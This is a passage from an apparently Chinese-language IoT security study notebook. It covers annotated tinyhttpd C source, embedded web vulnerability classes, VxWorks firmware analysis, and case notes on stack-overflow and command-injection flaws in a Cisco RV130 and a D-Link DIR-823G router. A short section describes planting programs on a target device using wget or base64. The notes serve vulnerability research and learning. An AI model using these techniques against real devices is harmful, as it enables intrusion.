style="color:#3ad900;font-weight:400">&quot;your&nbsp;request&nbsp;because&nbsp;the&nbsp;resource&nbsp;specifiedrn&quot;</span>);<br />&nbsp;send(client,&nbsp;buf,&nbsp;strlen(buf),&nbsp;<span style="color:#ff0044;font-weight:400">0</span>);<br />&nbsp;sprintf(buf,&nbsp;<span style="color:#3ad900;font-weight:400">&quot;is&nbsp;unavailable&nbsp;or&nbsp;nonexistent.rn&quot;</span>);<br />&nbsp;send(client,&nbsp;buf,&nbsp;strlen(buf),&nbsp;<span style="color:#ff0044;font-weight:400">0</span>);<br />&nbsp;sprintf(buf,&nbsp;<span style="color:#3ad900;font-weight:400">&quot;&lt;/BODY&gt;&lt;/HTML&gt;rn&quot;</span>);<br />&nbsp;send(client,&nbsp;buf,&nbsp;strlen(buf),&nbsp;<span style="color:#ff0044;font-weight:400">0</span>);<br />}<br />&nbsp;<br /><span style="color:#0088ff;font-weight:400">/**********************************************************************/</span><br /><span style="color:#0088ff;font-weight:400">/*&nbsp;Send&nbsp;a&nbsp;regular&nbsp;file&nbsp;to&nbsp;the&nbsp;client.&nbsp;&nbsp;Use&nbsp;headers,&nbsp;and&nbsp;report<br />&nbsp;*&nbsp;errors&nbsp;to&nbsp;client&nbsp;if&nbsp;they&nbsp;occur.<br />&nbsp;*&nbsp;Parameters:&nbsp;a&nbsp;pointer&nbsp;to&nbsp;a&nbsp;file&nbsp;structure&nbsp;produced&nbsp;from&nbsp;the&nbsp;socket<br />&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;file&nbsp;descriptor<br />&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;the&nbsp;name&nbsp;of&nbsp;the&nbsp;file&nbsp;to&nbsp;serve&nbsp;*/</span><br /><span style="color:#0088ff;font-weight:400">/**********************************************************************/</span><br /><span style="color:#0088ff;font-weight:400">//将请求的文件发送回浏览器客户端</span><br /><span style="color:#7f0044;font-weight:400">void</span>&nbsp;serve_file(<span style="color:#7f0044;font-weight:400">int</span>&nbsp;client,&nbsp;<span style="color:#7f0044;font-weight:400">const</span>&nbsp;<span style="color:#7f0044;font-weight:400">char</span>&nbsp;*filename)<br />{<br />&nbsp;FILE&nbsp;*resource&nbsp;=&nbsp;<span style="color:#0088ff;font-weight:700">NULL</span>;<br />&nbsp;<span style="color:#7f0044;font-weight:400">int</span>&nbsp;numchars&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">1</span>;<br />&nbsp;<span style="color:#7f0044;font-weight:400">char</span>&nbsp;buf[<span style="color:#ff0044;font-weight:400">1024</span>];<br />&nbsp;<br />&nbsp;buf[<span style="color:#ff0044;font-weight:400">0</span>]&nbsp;=&nbsp;<span style="color:#00117f;font-weight:400">&#39;A&#39;</span>;&nbsp;buf[<span style="color:#ff0044;font-weight:400">1</span>]&nbsp;=&nbsp;&#39;&#39;;<span style="color:#0088ff;font-weight:400">//这个赋值不清楚是干什么的</span><br />&nbsp;<span style="color:#ff9d00;font-weight:700">while</span>&nbsp;((numchars&nbsp;&gt;&nbsp;<span style="color:#ff0044;font-weight:400">0</span>)&nbsp;&amp;&amp;&nbsp;strcmp(<span style="color:#3ad900;font-weight:400">&quot;n&quot;</span>,&nbsp;buf))&nbsp;<span style="color:#0088ff;font-weight:400">//将HTTP请求头读取并丢弃</span><br />&nbsp;&nbsp;numchars&nbsp;=&nbsp;get_line(client,&nbsp;buf,&nbsp;<span style="color:#ff9d00;font-weight:400">sizeof</span>(buf));<br /><span style="color:#0088ff;font-weight:400">//打开文件</span><br />&nbsp;resource&nbsp;=&nbsp;fopen(filename,&nbsp;<span style="color:#3ad900;font-weight:400">&quot;r&quot;</span>);<br />&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(resource&nbsp;==&nbsp;<span style="color:#0088ff;font-weight:700">NULL</span>)<br />&nbsp;<span style="color:#0088ff;font-weight:400">//如果文件不存在，则返回not_found</span><br />&nbsp;&nbsp;not_found(client);<br />&nbsp;<span style="color:#ff9d00;font-weight:700">else</span><br />&nbsp;{<br />&nbsp;<span style="color:#0088ff;font-weight:400">//添加HTTP头</span><br />&nbsp;&nbsp;headers(client,&nbsp;filename);<br />&nbsp;<span style="color:#0088ff;font-weight:400">//并发送文件内容</span><br />&nbsp;&nbsp;cat(client,&nbsp;resource);<br />&nbsp;}<br />&nbsp;fclose(resource);<span style="color:#0088ff;font-weight:400">//关闭文件句柄</span><br />}<br />&nbsp;<br /><span style="color:#0088ff;font-weight:400">/**********************************************************************/</span><br /><span style="color:#0088ff;font-weight:400">/*&nbsp;This&nbsp;function&nbsp;starts&nbsp;the&nbsp;process&nbsp;of&nbsp;listening&nbsp;for&nbsp;web&nbsp;connections<br />&nbsp;*&nbsp;on&nbsp;a&nbsp;specified&nbsp;port.&nbsp;&nbsp;If&nbsp;the&nbsp;port&nbsp;is&nbsp;0,&nbsp;then&nbsp;dynamically&nbsp;allocate&nbsp;a<br />&nbsp;*&nbsp;port&nbsp;and&nbsp;modify&nbsp;the&nbsp;original&nbsp;port&nbsp;variable&nbsp;to&nbsp;reflect&nbsp;the&nbsp;actual<br />&nbsp;*&nbsp;port.<br />&nbsp;*&nbsp;Parameters:&nbsp;pointer&nbsp;to&nbsp;variable&nbsp;containing&nbsp;the&nbsp;port&nbsp;to&nbsp;connect&nbsp;on<br />&nbsp;*&nbsp;Returns:&nbsp;the&nbsp;socket&nbsp;*/</span><br /><span style="color:#0088ff;font-weight:400">/**********************************************************************/</span><br /><span style="color:#0088ff;font-weight:400">//启动服务端</span><br /><span style="color:#7f0044;font-weight:400">int</span>&nbsp;startup(u_short&nbsp;*port)<br />{<br />&nbsp;<span style="color:#7f0044;font-weight:400">int</span>&nbsp;httpd&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">0</span>;<br />&nbsp;<span style="color:#ff9d00;font-weight:700">struct</span>&nbsp;sockaddr_in&nbsp;name;<br /><span style="color:#0088ff;font-weight:400">//设置http&nbsp;socket</span><br />&nbsp;httpd&nbsp;=&nbsp;socket(PF_INET,&nbsp;SOCK_STREAM,&nbsp;<span style="color:#ff0044;font-weight:400">0</span>);<br />&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(httpd&nbsp;==&nbsp;-<span style="color:#ff0044;font-weight:400">1</span>)<br />&nbsp;&nbsp;error_die(<span style="color:#3ad900;font-weight:400">&quot;socket&quot;</span>);<br />&nbsp;memset(&amp;name,&nbsp;<span style="color:#ff0044;font-weight:400">0</span>,&nbsp;<span style="color:#ff9d00;font-weight:400">sizeof</span>(name));<br />&nbsp;name.sin_family&nbsp;=&nbsp;AF_INET;<br />&nbsp;name.sin_port&nbsp;=&nbsp;htons(*port);<br />&nbsp;name.sin_addr.s_addr&nbsp;=&nbsp;htonl(INADDR_ANY);<br />&nbsp;<span style="color:#0088ff;font-weight:400">//绑定端口</span><br />&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(bind(httpd,&nbsp;(<span style="color:#ff9d00;font-weight:700">struct</span>&nbsp;sockaddr&nbsp;*)&amp;name,&nbsp;<span style="color:#ff9d00;font-weight:400">sizeof</span>(name))&nbsp;&lt;&nbsp;<span style="color:#ff0044;font-weight:400">0</span>)<br />&nbsp;&nbsp;error_die(<span style="color:#3ad900;font-weight:400">&quot;bind&quot;</span>);<br />&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(*port&nbsp;==&nbsp;<span style="color:#ff0044;font-weight:400">0</span>)&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">/*动态分配一个端口&nbsp;*/</span><br />&nbsp;{<br />&nbsp;&nbsp;<span style="color:#7f0044;font-weight:400">int</span>&nbsp;namelen&nbsp;=&nbsp;<span style="color:#ff9d00;font-weight:400">sizeof</span>(name);<br />&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(getsockname(httpd,&nbsp;(<span style="color:#ff9d00;font-weight:700">struct</span>&nbsp;sockaddr&nbsp;*)&amp;name,&nbsp;&amp;namelen)&nbsp;==&nbsp;-<span style="color:#ff0044;font-weight:400">1</span>)<br />&nbsp;&nbsp;&nbsp;error_die(<span style="color:#3ad900;font-weight:400">&quot;getsockname&quot;</span>);<br />&nbsp;&nbsp;*port&nbsp;=&nbsp;ntohs(name.sin_port);<br />&nbsp;}<br />&nbsp;<span style="color:#0088ff;font-weight:400">//监听连接</span><br />&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(listen(httpd,&nbsp;<span style="color:#ff0044;font-weight:400">5</span>)&nbsp;&lt;&nbsp;<span style="color:#ff0044;font-weight:400">0</span>)<br />&nbsp;&nbsp;error_die(<span style="color:#3ad900;font-weight:400">&quot;listen&quot;</span>);<br />&nbsp;<span style="color:#ff9d00;font-weight:700">return</span>(httpd);<br />}<br />&nbsp;<br /><span style="color:#0088ff;font-weight:400">/**********************************************************************/</span><br /><span style="color:#0088ff;font-weight:400">/*&nbsp;Inform&nbsp;the&nbsp;client&nbsp;that&nbsp;the&nbsp;requested&nbsp;web&nbsp;method&nbsp;has&nbsp;not&nbsp;been<br />&nbsp;*&nbsp;implemented.<br />&nbsp;*&nbsp;Parameter:&nbsp;the&nbsp;client&nbsp;socket&nbsp;*/</span><br /><span style="color:#0088ff;font-weight:400">/**********************************************************************/</span><br /><span style="color:#7f0044;font-weight:400">void</span>&nbsp;unimplemented(<span style="color:#7f0044;font-weight:400">int</span>&nbsp;client)<br />{<br />&nbsp;<span style="color:#7f0044;font-weight:400">char</span>&nbsp;buf[<span style="color:#ff0044;font-weight:400">1024</span>];<br /><span style="color:#0088ff;font-weight:400">//发送501说明相应方法没有实现</span><br />&nbsp;sprintf(buf,&nbsp;<span style="color:#3ad900;font-weight:400">&quot;HTTP/1.0&nbsp;501&nbsp;Method&nbsp;Not&nbsp;Implementedrn&quot;</span>);<br />&nbsp;send(client,&nbsp;buf,&nbsp;strlen(buf),&nbsp;<span style="color:#ff0044;font-weight:400">0</span>);<br />&nbsp;sprintf(buf,&nbsp;SERVER_STRING);<br />&nbsp;send(client,&nbsp;buf,&nbsp;strlen(buf),&nbsp;<span style="color:#ff0044;font-weight:400">0</span>);<br />&nbsp;sprintf(buf,&nbsp;<span style="color:#3ad900;font-weight:400">&quot;Content-Type:&nbsp;text/htmlrn&quot;</span>);<br />&nbsp;send(client,&nbsp;buf,&nbsp;strlen(buf),&nbsp;<span style="color:#ff0044;font-weight:400">0</span>);<br />&nbsp;sprintf(buf,&nbsp;<span style="color:#3ad900;font-weight:400">&quot;rn&quot;</span>);<br />&nbsp;send(client,&nbsp;buf,&nbsp;strlen(buf),&nbsp;<span style="color:#ff0044;font-weight:400">0</span>);<br />&nbsp;sprintf(buf,&nbsp;<span style="color:#3ad900;font-weight:400">&quot;&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;Method&nbsp;Not&nbsp;Implementedrn&quot;</span>);<br />&nbsp;send(client,&nbsp;buf,&nbsp;strlen(buf),&nbsp;<span style="color:#ff0044;font-weight:400">0</span>);<br />&nbsp;sprintf(buf,&nbsp;<span style="color:#3ad900;font-weight:400">&quot;&lt;/TITLE&gt;&lt;/HEAD&gt;rn&quot;</span>);<br />&nbsp;send(client,&nbsp;buf,&nbsp;strlen(buf),&nbsp;<span style="color:#ff0044;font-weight:400">0</span>);<br />&nbsp;sprintf(buf,&nbsp;<span style="color:#3ad900;font-weight:400">&quot;&lt;BODY&gt;&lt;P&gt;HTTP&nbsp;request&nbsp;method&nbsp;not&nbsp;supported.rn&quot;</span>);<br />&nbsp;send(client,&nbsp;buf,&nbsp;strlen(buf),&nbsp;<span style="color:#ff0044;font-weight:400">0</span>);<br />&nbsp;sprintf(buf,&nbsp;<span style="color:#3ad900;font-weight:400">&quot;&lt;/BODY&gt;&lt;/HTML&gt;rn&quot;</span>);<br />&nbsp;send(client,&nbsp;buf,&nbsp;strlen(buf),&nbsp;<span style="color:#ff0044;font-weight:400">0</span>);<br />}<br />&nbsp;<br /><span style="color:#0088ff;font-weight:400">/**********************************************************************/</span><br />&nbsp;<br /><span style="color:#7f0044;font-weight:400">int</span>&nbsp;main(<span style="color:#7f0044;font-weight:400">void</span>)<br />{<br />&nbsp;<span style="color:#7f0044;font-weight:400">int</span>&nbsp;server_sock&nbsp;=&nbsp;-<span style="color:#ff0044;font-weight:400">1</span>;<br />&nbsp;u_short&nbsp;port&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">0</span>;<br />&nbsp;<span style="color:#7f0044;font-weight:400">int</span>&nbsp;client_sock&nbsp;=&nbsp;-<span style="color:#ff0044;font-weight:400">1</span>;<br />&nbsp;<span style="color:#ff9d00;font-weight:700">struct</span>&nbsp;sockaddr_in&nbsp;client_name;<br />&nbsp;<span style="color:#7f0044;font-weight:400">int</span>&nbsp;client_name_len&nbsp;=&nbsp;<span style="color:#ff9d00;font-weight:400">sizeof</span>(client_name);<br />&nbsp;pthread_t&nbsp;newthread;<br /><span style="color:#0088ff;font-weight:400">//启动server&nbsp;socket</span><br />&nbsp;server_sock&nbsp;=&nbsp;startup(&amp;port);<br />&nbsp;<br />&nbsp;printf(<span style="color:#3ad900;font-weight:400">&quot;httpd&nbsp;running&nbsp;on&nbsp;port&nbsp;%dn&quot;</span>,&nbsp;port);<br />&nbsp;<br />&nbsp;<span style="color:#ff9d00;font-weight:700">while</span>&nbsp;(<span style="color:#ff0044;font-weight:400">1</span>)<br />&nbsp;{<br />&nbsp;<span style="color:#0088ff;font-weight:400">//接受客户端连接</span><br />&nbsp;&nbsp;client_sock&nbsp;=&nbsp;accept(server_sock,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(<span style="color:#ff9d00;font-weight:700">struct</span>&nbsp;sockaddr&nbsp;*)&amp;client_name,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&amp;client_name_len);<br />&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(client_sock&nbsp;==&nbsp;-<span style="color:#ff0044;font-weight:400">1</span>)<br />&nbsp;&nbsp;&nbsp;error_die(<span style="color:#3ad900;font-weight:400">&quot;accept&quot;</span>);<br />&nbsp;<span style="color:#0088ff;font-weight:400">/*启动线程处理新的连接&nbsp;*/</span><br />&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(pthread_create(&amp;newthread&nbsp;,&nbsp;<span style="color:#0088ff;font-weight:700">NULL</span>,&nbsp;accept_request,&nbsp;client_sock)&nbsp;!=&nbsp;<span style="color:#ff0044;font-weight:400">0</span>)<br />&nbsp;&nbsp;&nbsp;perror(<span style="color:#3ad900;font-weight:400">&quot;pthread_create&quot;</span>);<br />&nbsp;}<br /><span style="color:#0088ff;font-weight:400">//关闭server&nbsp;socket</span><br />&nbsp;close(server_sock);<br />&nbsp;<br />&nbsp;<span style="color:#ff9d00;font-weight:700">return</span>(<span style="color:#ff0044;font-weight:400">0</span>);<br />}<br /></div></div><br /><br /></div><div class='page'><h1 class='title level-3'>常见嵌入式web漏洞</h1><br/><a href=""><img src="images\292-1.png" alt="images\292-1.png" /></a></div><div class='page'><h1 class='title level-4'>命令执行</h1><br/><a href=""><img src="images\298-1.png" alt="images\298-1.png" /></a><br /><br /><a href=""><img src="images\298-2.png" alt="images\298-2.png" /></a><br /><br /><a href=""><img src="images\298-3.png" alt="images\298-3.png" /></a><br /><br /></div><div class='page'><h1 class='title level-4'>任意文件下载</h1><br/><a href=""><img src="images\295-1.png" alt="images\295-1.png" /></a><br /><br /><a href=""><img src="images\295-2.png" alt="images\295-2.png" /></a><br /><br />	<a href="linux--linux敏感目录.html">linux中敏感目录</a><br />	<br />	<br /></div><div class='page'><h1 class='title level-4'>未授权访问</h1><br/><a href=""><img src="images\297-1.png" alt="images\297-1.png" /></a><br /><br /><a href=""><img src="images\297-2.png" alt="images\297-2.png" /></a><br /><br /></div><div class='page'><h1 class='title level-4'>信息泄露</h1><br/><a href="物联网安全--工具--firmwalker.py.html">使用开源脚本检测文件系统敏感文件路径</a><br /><a href=""><img src="images\294-1.png" alt="images\294-1.png" /></a><br /><a href=""><img src="images\294-2.png" alt="images\294-2.png" /></a><br /><a href=""><img src="images\294-3.png" alt="images\294-3.png" /></a></div><div class='page'><h1 class='title level-3'>典型嵌入式web服务器</h1><br/><a href=""><img src="images\268-1.png" alt="images\268-1.png" /></a><br />lighhttpd开源<br />goahead编译后大概只有几十k</div><div class='page'><h1 class='title level-4'>lighthttpd</h1><br/>源码下载<br /><a href=""><img src="images\291-1.png" alt="images\291-1.png" /></a><br /><br />运行configure文件生成makefile，之后使用make命令进行编译，make install命令安装<br /><a href=""><img src="images\291-2.png" alt="images\291-2.png" /></a><br /><br />配置文件为lighttpd.conf文件<br /><a href=""><img src="images\291-3.png" alt="images\291-3.png" /></a><br /><br />该文件中指定了日志根目录、服务器根目录等位置，也可以修改端口<br /><a href=""><img src="images\291-4.png" alt="images\291-4.png" /></a><a href=""><img src="images\291-5.png" alt="images\291-5.png" /></a><br /><br />启动服务器<br /><a href=""><img src="images\291-6.png" alt="images\291-6.png" /></a><br /><br /><br /><br /><br /><br /></div><div class='page'><h1 class='title level-3'>嵌入式通讯soap协议</h1><br/><a href=""><img src="images\290-1.png" alt="images\290-1.png" /></a><br /><br />使用命名空间<br /><a href=""><img src="images\290-2.png" alt="images\290-2.png" /></a><br /><br />消息组成<br /><br /><br /><a href=""><img src="images\290-3.png" alt="images\290-3.png" /></a><br /><br />语法规则<br /><a href=""><img src="images\290-4.png" alt="images\290-4.png" /></a><br /><br />基本消息结构<br /><a href=""><img src="images\290-5.png" alt="images\290-5.png" /></a><br /><br />body元素<br /><a href=""><img src="images\290-6.png" alt="images\290-6.png" /></a><br /><br />实例<br /><a href=""><img src="images\290-7.png" alt="images\290-7.png" /></a><br /><a href=""><img src="images\290-8.png" alt="images\290-8.png" /></a><br /><br /><br /></div><div class='page'><h1 class='title level-2'>嵌入式操作系统</h1><br/>操作系统分类<br />根据内核结构划分:<br />微内核(Windows)<br />宏内核(Linux)<br /><br /> <br />根据用途划分:<br />通用操作系统(PC等)<br />嵌入式操作系统(物联网设备等)<br />专用操作系统(军事、医疗等)<br /><br /> <br />根据信号处理的实时性:<br />实时操作系统(RTOS,VxWorks等)<br />分时操作系统(Linux等)<br /><br />嵌入式操作系统-RTOS<br />1.开放源代码&amp;免费的RTOS:<br />Raw-OS<br />CoOS<br /><br /> <br />2.开放源代码:<br />RT-Thread<br />eCos<br />FreeRTOS<br />......<br /><br /> <br />3.非开源代码:<br />VxWorks<br />Windows CE<br />µnOS<br />MicroC/OS-II<br />MQX RTOS<br />VRTX<br />RSX-11<br />QNX<br /><br />VxWorks分类<br />1.可加载型VxWorks镜像：存储在开发机上，运行在板上RAM中<br />2.基于ROM的VxWorks镜像：存储在板上ROM，运行在板上RAM中<br />3.ROM驻留的VxWorks镜像：存储在板上ROM，运行在板上ROM中</div><div class='page'><h1 class='title level-3'>linux</h1><br/><br /></div><div class='page'><h1 class='title level-4'>目录结构</h1><br/><h1>目录结构 </h1><br /><h2>路由器的web目录可能存在于var目录下</h2><br /><a href=""><img src="images\218-1.png" alt="images\218-1.png" /></a><br /><br />固件模拟执行时，可能缺失指定proc目录或lib目录下的内容，需要重新挂载后才能成功模拟<br /><a href=""><img src="images\218-2.png" alt="images\218-2.png" /></a><br /><br /><a href=""><img src="images\218-3.png" alt="images\218-3.png" /></a><br /><br /></div><div class='page'><h1 class='title level-4'>内核</h1><br/><a href=""><img src="images\219-1.png" alt="images\219-1.png" /></a></div><div class='page'><h1 class='title level-4'>系统镜像</h1><br/>可能的镜像格式，保存于/boot目录下<br /><br /><a href=""><img src="images\220-1.png" alt="images\220-1.png" /></a><br /></div><div class='page'><h1 class='title level-3'>vxworks</h1><br/><a href=""><img src="images\221-1.png" alt="images\221-1.png" /></a><br /><br /><a href=""><img src="images\221-2.png" alt="images\221-2.png" /></a><br /><br /><a href=""><img src="images\221-3.png" alt="images\221-3.png" /></a><br /><br /><a href=""><img src="images\221-4.png" alt="images\221-4.png" /></a><br /><br /><a href=""><img src="images\221-5.png" alt="images\221-5.png" /></a><br /><br /><br /><br /><br /></div><div class='page'><h1 class='title level-4'>分析</h1><br/>实际分析时，关注固件的加载地址、关注固件的符号表，两者结合可以解析固件中的函数</div><div class='page'><h1 class='title level-5'>vxworks调试命令行</h1><br/>串口启动信息<br /><a href=""><img src="images\619-1.png" alt="images\619-1.png" /></a><br />通过键盘输入?键获取VxWorks的CmdTask命令行(前提是VxWorks固件中编入了这个模块)<br /><a href=""><img src="images\619-2.png" alt="images\619-2.png" /></a><br />可能有用的调试命令<br />• tftp - tftp命令行工具。<br />• mem - 内存操作相关的命令行工具。<br />• flash - flash相关的命令行工具。<br />• net - 网络相关的命令行工具。<br />• system - 系统命令相关的指令<br /><br /><br /></div><div class='page'><h1 class='title level-5'>起手分析函数</h1><br/>vxwork中分析的第一个函数可以为<br />startInflate<br />该函数中将压缩的代码段解压，并加载到指定内存地址，再跳转到该内存地址处执行代码<br />通过对该函数分析，可以确定代码的内存加载基址<br /><br /><a href=""><img src="images\645-1.png" alt="images\645-1.png" /></a></div><div class='page'><h1 class='title level-5'>确定固件加载基址</h1><br/><h3>uimage header</h3>中一般存在固件的加载地址<br /><a href=""><img src="images\507-1.png" alt="images\507-1.png" /></a><br /><br /><br /><br /></div><div class='page'><h1 class='title level-5'>确定函数符号表</h1><br/>部分固件中，符号表未与系统镜像保存在同一个文件，而是单独作为一个文件，可以通过grep命令以及hexdump查看文件中是否存在函数名称<br /><a href=""><img src="images\508-1.png" alt="images\508-1.png" /></a><br /><br />确定固件符号表之后，需要从中提取符号字符串、符号对应内存地址等信息，写python脚本修复固件<br /><a href=""><img src="images\508-2.png" alt="images\508-2.png" /></a><br /><br /></div><div class='page'><h1 class='title level-4'>分析实例</h1><br/><a href="https://paper.seebug.org/771/">基于 VxWorks 的嵌入式设备固件分析方法介绍 (seebug.org)</a><br />	<a href=""><img src="images\488-1.png" alt="images\488-1.png" /></a><br /><a href=""><img src="images\488-2.png" alt="images\488-2.png" /></a></div><div class='page'><h1 class='title level-4'>特征</h1><br/><h3>使用binwalk -e 默认提取升级包中的文件。</h3><br /><h3>binwalk -e wr886nv7.bin</h3><br /><br /><h3>进入目录后查找，是否存在包含VxWorks关键函数名的文件。</h3><br /><h3>cd _wr886nv6-20180123.bin.extracted </h3><br /><h3>grep -r bzero ./</h3><br /><br />vxworks系统镜像可能以LZMA压缩格式保存在固件的一个段中了，使用dd将该lzma段分离出来，将其解压（lzma -d）从而得到系统镜像<br /><a href="https://www.secpulse.com/archives/75635.html">https://www.secpulse.com/archives/75635.html</a><br /><a href=""><img src="images\497-1.png" alt="images\497-1.png" /></a><br /><br /></div><div class='page'><h1 class='title level-4'>相关资料</h1><br/><a href="https://www.secpulse.com/archives/75635.html">https://www.secpulse.com/archives/75635.html</a><br /><a href="https://paper.seebug.org/771/">https://paper.seebug.org/771/</a><br /></div><div class='page'><h1 class='title level-5'>VxHunter：针对VxWorks设备的固件分析工具</h1><br/><a href="https://www.secrss.com/articles/10027">VxHunter：针对VxWorks设备的固件分析工具 - 安全内参 | 决策者的网络安全知识库 (secrss.com)</a><br /><a href=""><img src="images\838-1.png" alt="images\838-1.png" /></a></div><div class='page'><h1 class='title level-5'>VxWorks固件分析方法总结</h1><br/><a href="https://www.cnblogs.com/yangmzh3/p/11214451.html">VxWorks固件分析方法总结 - 燕麦粥 - 博客园 (cnblogs.com)</a><br /><a href=""><img src="images\839-1.png" alt="images\839-1.png" /></a></div><div class='page'><h1 class='title level-3'>分时与实时操作系统</h1><br/><h1>分时操作系统</h1><br /><a href=""><img src="images\216-1.png" alt="images\216-1.png" /></a><br /><br /><h1>实时操作系统</h1><br />实时操作系统即增加了进程管理功能的单片机<br /><a href=""><img src="images\216-2.png" alt="images\216-2.png" /></a> <br /><br /><a href=""><img src="images\216-3.png" alt="images\216-3.png" /></a><br /><br /><a href=""><img src="images\216-4.png" alt="images\216-4.png" /></a><br /><br />FreeRTOS是最简短的实时操作系统，可以作为入门学习目标<br /><a href=""><img src="images\216-5.png" alt="images\216-5.png" /></a></div><div class='page'><h1 class='title level-2'>实际固件漏洞</h1><br/><h1>Cisco RV130</h1><br />官网下载固件啊，思科固件一般使用自家操作系统思科OS，而该固件使用linux<br />binwalk -Me直接提取文件系统，或者使用dd直接提取固件第三个区块<br />漏洞产生于usr/sbin/httpd，httpd程序为厂商编写的解析http请求的程序，而不使用apache等框架<br />漏洞点：post请求登录login.cgi时传递password时存在栈溢出<br /><a href=""><img src="images\267-1.png" alt="images\267-1.png" /></a><br /><br /><a href=""><img src="images\267-2.png" alt="images\267-2.png" /></a><br /><br /><a href=""><img src="images\267-3.png" alt="images\267-3.png" /></a><br /><br /><a href=""><img src="images\267-4.png" alt="images\267-4.png" /></a><br /><br /><a href=""><img src="images\267-5.png" alt="images\267-5.png" /></a><br /><br /><br /><h1>D-Link DIR-823G</h1><br />goahead服务端程序导致的漏洞<br /><a href=""><img src="images\267-6.png" alt="images\267-6.png" /></a><br /><br /><br />binwalk直接解包固件<br />查看启动项查看 /etc/init.d目录下的脚本<br /><a href=""><img src="images\267-7.png" alt="images\267-7.png" /></a><br />脚本中发现启动了gohead的webserver<br /><a href=""><img src="images\267-8.png" alt="images\267-8.png" /></a> <br />整个文件系统中通过grep命令搜索gohead相关 -ir忽略大小写<br /><a href=""><img src="images\267-9.png" alt="images\267-9.png" /></a><br /><br />根据漏洞描述，是往/HNAP1发送请求时导致漏洞，故搜索HNAP1，匹配到二进制文件goahead<br /><a href=""><img src="images\267-10.png" alt="images\267-10.png" /></a><br /><br />找到/HNAP1处理函数<br /><a href=""><img src="images\267-11.png" alt="images\267-11.png" /></a><br /><br /><a href=""><img src="images\267-12.png" alt="images\267-12.png" /></a><br /><a href=""><img src="images\267-13.png" alt="images\267-13.png" /></a><br /><a href=""><img src="images\267-14.png" alt="images\267-14.png" /></a><br /><a href=""><img src="images\267-15.png" alt="images\267-15.png" /></a><br />漏洞关键代码<br /><a href=""><img src="images\267-16.png" alt="images\267-16.png" /></a><br /><a href=""><img src="images\267-17.png" alt="images\267-17.png" /></a><br /><br />漏洞利用关键在于当输入被格式化为%s时使用引号闭合字符串<br /><a href=""><img src="images\267-18.png" alt="images\267-18.png" /></a><br /><br />ghidra中搜索字符串<br /><a href=""><img src="images\267-19.png" alt="images\267-19.png" /></a><br /><br />查看指定函数的调用关系<br /><a href=""><img src="images\267-20.png" alt="images\267-20.png" /></a><br /><br /><a href=""><img src="images\267-21.png" alt="images\267-21.png" /></a><br /><br />使用firmadyne编写脚本模拟执行固件、 不推荐直接使用fat.py可能模拟失败<br /><a href=""><img src="images\267-22.png" alt="images\267-22.png" /></a><br /><br /><br /><br /></div><div class='page'><h1 class='title level-2'>文件传输</h1><br/><a href="物联网安全--工具--tftp.html">使用设备的tftp协议</a><br /><br />scp协议传输文件（scp基于ssh协议）<br /><br />目标设备自带 base64 命令，可以将程序进行 base64 编码后通过终端输入写入到设备，然后在设备上base64解码出文件<br /><br />目标设备自带wget命令，可以将程序放到一个搭建好的服务器上，通过下载的方式将程序下载到终端设备中</div><div class='page'><h1 class='title level-2'>文件系统</h1><br/><h1>文件系统</h1><br /><a href=""><img src="images\183-1.png" alt="images\183-1.png" /></a><br /><br /><h1>linux虚拟文件系统</h1><br /><a href=""><img src="images\183-2.png" alt="images\183-2.png" /></a><br /><br /><h1>常见文件系统</h1><br /><a href=""><img src="images\183-3.png" alt="images\183-3.png" /></a><br /><br /><a href=""><img src="images\183-4.png" alt="images\183-4.png" /></a><br /><br /></div><div class='page'><h1 class='title level-3'>linux敏感信息目录</h1><br/><a href="linux--linux敏感目录.html">linux敏感信息目录</a></div><div class='page'><h1 class='title level-3'>linux中挂载并访问特定文件系统</h1><br/></div><div class='page'><h1 class='title level-4'>jffs2</h1><br/>如果要想确定文件系统所在的位置的话，我们可以使用Binwalk。我们稍后将在本文中详细讨论Binwalk的各种法，但现在，我们只是用它来找出文件系统所在的确切地址。（使用grep过滤filesystem相关信息）<br /><a href=""><img src="images\627-1.png" alt="images\627-1.png" /></a><br />为了在我们的系统上安装jffs2映像，我们要做的第一件事就是在RAM中提供一个MTD分区，具体大小由total_size指定。<br /><br />modprobe mtdram total_size=25247744<br /><br />接下来，我们将创建一个块设备，通过它我们就可以访问相应分区了，然后加载对jffs2文件系统的支持，因为它不是默认启用的。<br /><br />modprobe mtdblock<br />modprobe jffs2<br /><br />接下来的要做的是从上面的位置复制文件系统，并使用dd命令将其输出到一个新文件中。<br /><a href=""><img src="images\627-2.png" alt="images\627-2.png" /></a><br />一旦完成上面的工作，我们就可以把将文件系统从所建的文件（filesys）中复制到mtdblock0了。<br /><a href=""><img src="images\627-3.png" alt="images\627-3.png" /></a><br />之后，我们可以使用mount挂载文件系统，以便我们可以访问它。我们可以通过mount的帮助信息来了解如何挂载我们的映像。<br /><a href=""><img src="images\627-4.png" alt="images\627-4.png" /></a><br 